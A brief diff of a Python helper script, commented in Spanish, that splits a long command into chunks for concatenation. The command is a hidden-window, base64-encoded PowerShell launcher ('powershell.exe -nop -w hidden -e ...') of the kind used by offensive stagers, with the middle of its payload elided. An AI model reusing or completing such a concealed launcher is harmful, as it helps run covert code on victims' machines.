@@ -1,3 +1,5 @@
+#!/usr/bin/python
+#Divide el comando en varias líneas y las concatena.
 str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoA..........AHQAKAAkAHMAKQA7AA=="
 
 n = 50
